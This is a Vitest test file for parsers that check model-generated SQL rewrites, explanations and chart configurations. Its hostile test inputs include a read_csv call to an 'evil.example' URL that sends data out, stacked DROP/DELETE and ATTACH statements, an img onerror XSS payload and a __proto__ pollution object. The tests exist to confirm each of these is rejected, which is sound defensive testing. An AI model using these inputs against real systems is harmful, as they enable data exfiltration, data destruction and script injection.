import { describe, it, expect } from "vitest";
import {
  applyChartSuggestion,
  isSingleReadOnlyQuery,
  parseChartSuggestion,
  parseExplanation,
  parseOptimizeResponse,
  resolveChartSuggestion,
  stripSqlLiterals,
} from "../actionParsers";
import type { ChartConfig } from "@/store/types";

const ctx = {
  columns: ["region", "month", "revenue", "orders"],
  numericColumns: ["revenue", "orders"],
};

const fallback: ChartConfig = {
  type: "bar",
  xAxis: "region",
  yAxis: "revenue",
  colors: ["#111111", "#222222"],
  showGrid: true,
};

describe("parseExplanation", () => {
  it("keeps markdown and newlines", () => {
    expect(parseExplanation("**Sales** rose.\n- north leads")).toBe(
      "**Sales** rose.\n- north leads"
    );
  });

  it("rejects empty output", () => {
    expect(parseExplanation("   \n ")).toBeNull();
  });

  it("strips control characters and bounds length", () => {
    const out = parseExplanation(`a\u0000b\u001b[31m${"x".repeat(10_000)}`)!;
    expect(out).not.toContain("\u0000");
    expect(out).not.toContain("\u001b");
    expect(out.length).toBeLessThanOrEqual(4_000);
    expect(out.endsWith("…")).toBe(true);
  });
});

describe("stripSqlLiterals / isSingleReadOnlyQuery", () => {
  it("collects string literals and blanks them", () => {
    const res = stripSqlLiterals("SELECT 'it''s; drop' AS \"weird;col\" FROM t -- ; x\n");
    expect(res?.strings).toEqual(["it's; drop"]);
    expect(res?.code).not.toContain(";");
  });

  it("returns null for unterminated quotes", () => {
    expect(stripSqlLiterals("SELECT 'oops")).toBeNull();
    expect(stripSqlLiterals("SELECT 1 /* open")).toBeNull();
  });

  it("accepts read-only single statements", () => {
    expect(isSingleReadOnlyQuery("SELECT * FROM t;")).toBe(true);
    expect(isSingleReadOnlyQuery("WITH a AS (SELECT 1) SELECT * FROM a")).toBe(true);
    expect(isSingleReadOnlyQuery("FROM t LIMIT 5")).toBe(true);
    expect(isSingleReadOnlyQuery("SELECT 'DROP TABLE x; DELETE' AS s")).toBe(true);
    expect(isSingleReadOnlyQuery("SELECT * FROM t LIMIT 5 OFFSET 10")).toBe(true);
  });

  it("rejects writes and multiple statements", () => {
    expect(isSingleReadOnlyQuery("DROP TABLE t")).toBe(false);
    expect(isSingleReadOnlyQuery("SELECT 1; DROP TABLE t")).toBe(false);
    expect(isSingleReadOnlyQuery("SELECT 1;\nDELETE FROM t;")).toBe(false);
    expect(isSingleReadOnlyQuery("WITH x AS (SELECT 1) INSERT INTO t SELECT * FROM x")).toBe(false);
    expect(isSingleReadOnlyQuery("SELECT * FROM t /* ; */ ; ATTACH 'x.db'")).toBe(false);
    expect(isSingleReadOnlyQuery("")).toBe(false);
  });
});

describe("parseOptimizeResponse", () => {
  const original = "SELECT * FROM orders WHERE region = 'north' ORDER BY amount";

  it("parses a fenced rewrite with reasons", () => {
    const res = parseOptimizeResponse(
      "```sql\nSELECT id, amount FROM orders WHERE region = 'north' ORDER BY amount\n```\n- Project only needed columns\n- Filter pushdown",
      original
    );
    expect(res).toEqual({
      ok: true,
      sql: "SELECT id, amount FROM orders WHERE region = 'north' ORDER BY amount",
      reasons: "- Project only needed columns\n- Filter pushdown",
      unchanged: false,
    });
  });

  it("flags an unchanged query", () => {
    const res = parseOptimizeResponse(
      "```sql\nselect *  from orders where region = 'north' order by amount;\n```\nAlready optimal.",
      original
    );
    expect(res.ok && res.unchanged).toBe(true);
  });

  it("accepts bare SQL without a fence", () => {
    const res = parseOptimizeResponse("SELECT id FROM orders", original);
    expect(res.ok && res.sql).toBe("SELECT id FROM orders");
  });

  it("rejects prose with no SQL", () => {
    const res = parseOptimizeResponse("I cannot help with that.", original);
    expect(res.ok).toBe(false);
  });

  it("rejects destructive or multi-statement rewrites", () => {
    expect(parseOptimizeResponse("```sql\nDROP TABLE orders\n```", original).ok).toBe(false);
    expect(parseOptimizeResponse("```sql\nSELECT 1; DELETE FROM orders\n```", original).ok).toBe(
      false
    );
  });

  it("rejects a rewrite that introduces a remote URL", () => {
    const res = parseOptimizeResponse(
      "```sql\nSELECT * FROM read_csv('https://evil.example/x.csv?d=' || 'north')\n```",
      original
    );
    expect(res.ok).toBe(false);
  });

  it("allows URLs the original query already used", () => {
    const withUrl = "SELECT * FROM 'https://data.example/a.parquet'";
    const res = parseOptimizeResponse(
      "```sql\nSELECT id FROM 'https://data.example/a.parquet'\n```",
      withUrl
    );
    expect(res.ok).toBe(true);
  });
});

describe("parseChartSuggestion", () => {
  it("parses a valid suggestion", () => {
    expect(
      parseChartSuggestion(
        '{"type":"line","xAxis":"month","yAxis":["revenue","orders"],"title":"Revenue by month","smooth":true}',
        ctx
      )
    ).toEqual({
      type: "line",
      xAxis: "month",
      yColumns: ["revenue", "orders"],
      title: "Revenue by month",
      smooth: true,
    });
  });

  it("accepts a fenced JSON block surrounded by prose and a string yAxis", () => {
    const s = parseChartSuggestion(
      'Sure!\n```json\n{"type":"bar","xAxis":"region","yAxis":"revenue"}\n```\nEnjoy.',
      ctx
    );
    expect(s?.yColumns).toEqual(["revenue"]);
  });

  it("accepts the series shape", () => {
    const s = parseChartSuggestion(
      '{"type":"grouped_bar","xAxis":"region","series":[{"column":"revenue"},{"column":"orders"}]}',
      ctx
    );
    expect(s?.yColumns).toEqual(["revenue", "orders"]);
  });

  it.each([
    ["not JSON", "bar chart please"],
    ["broken JSON", '{"type":"bar","xAxis":'],
    ["array", '[{"type":"bar"}]'],
    ["unknown type", '{"type":"sankey","xAxis":"region","yAxis":"revenue"}'],
    ["unrendered type", '{"type":"heatmap","xAxis":"region","yAxis":"revenue"}'],
    ["unknown x column", '{"type":"bar","xAxis":"nope","yAxis":"revenue"}'],
    ["unknown y column", '{"type":"bar","xAxis":"region","yAxis":"nope"}'],
    ["non-numeric y", '{"type":"bar","xAxis":"month","yAxis":"region"}'],
    ["y equals x", '{"type":"bar","xAxis":"revenue","yAxis":"revenue"}'],
    ["no y", '{"type":"bar","xAxis":"region"}'],
    ["pie with two y", '{"type":"pie","xAxis":"region","yAxis":["revenue","orders"]}'],
    ["wrong x type", '{"type":"bar","xAxis":42,"yAxis":"revenue"}'],
  ])("rejects %s", (_label, text) => {
    expect(parseChartSuggestion(text, ctx)).toBeNull();
  });

  it("ignores prototype-pollution keys and unknown fields", () => {
    const s = parseChartSuggestion(
      '{"__proto__":{"type":"bar","xAxis":"region","yAxis":"revenue"},"constructor":{"x":1},"onClick":"alert(1)"}',
      ctx
    );
    expect(s).toBeNull();
    expect(({} as Record<string, unknown>).xAxis).toBeUndefined();
  });

  it("drops invalid optional fields and sanitizes the title", () => {
    const s = parseChartSuggestion(
      JSON.stringify({
        type: "bar",
        xAxis: "region",
        yAxis: "revenue",
        title: `<img src=x onerror=alert(1)>\u0000${"t".repeat(500)}`,
        smooth: "yes",
        sortOrder: "sideways",
        limit: 1e9,
      }),
      ctx
    )!;
    expect(s.title!.length).toBeLessThanOrEqual(80);
    expect(s.title).not.toContain("\u0000");
    expect(s.smooth).toBeUndefined();
    expect(s.sortOrder).toBeUndefined();
    expect(s.limit).toBeUndefined();
  });

  it("rejects oversized y lists", () => {
    const many = Array.from({ length: 9 }, () => "revenue");
    expect(
      parseChartSuggestion(JSON.stringify({ type: "bar", xAxis: "region", yAxis: many }), ctx)
    ).toBeNull();
  });
});

describe("applyChartSuggestion / resolveChartSuggestion", () => {
  it("maps multiple y columns to series and keeps base styling", () => {
    const config = applyChartSuggestion(fallback, {
      type: "stacked_bar",
      xAxis: "region",
      yColumns: ["revenue", "orders"],
      sortOrder: "desc",
      limit: 10,
    });
    expect(config.yAxis).toBeUndefined();
    expect(config.series?.map((s) => s.column)).toEqual(["revenue", "orders"]);
    expect(config.series?.[1].color).toBe("#222222");
    expect(config.transform).toEqual({ sortBy: "revenue", sortOrder: "desc", limit: 10 });
    expect(config.showGrid).toBe(true);
  });

  it("falls back to the auto config on invalid output", () => {
    const res = resolveChartSuggestion('{"type":"sankey"}', ctx, fallback);
    expect(res).toEqual({ config: fallback, fromModel: false });
  });

  it("uses the model config when valid", () => {
    const res = resolveChartSuggestion(
      '{"type":"pie","xAxis":"region","yAxis":["orders"]}',
      ctx,
      fallback
    );
    expect(res.fromModel).toBe(true);
    expect(res.config).toMatchObject({ type: "pie", xAxis: "region", yAxis: "orders" });
  });
});
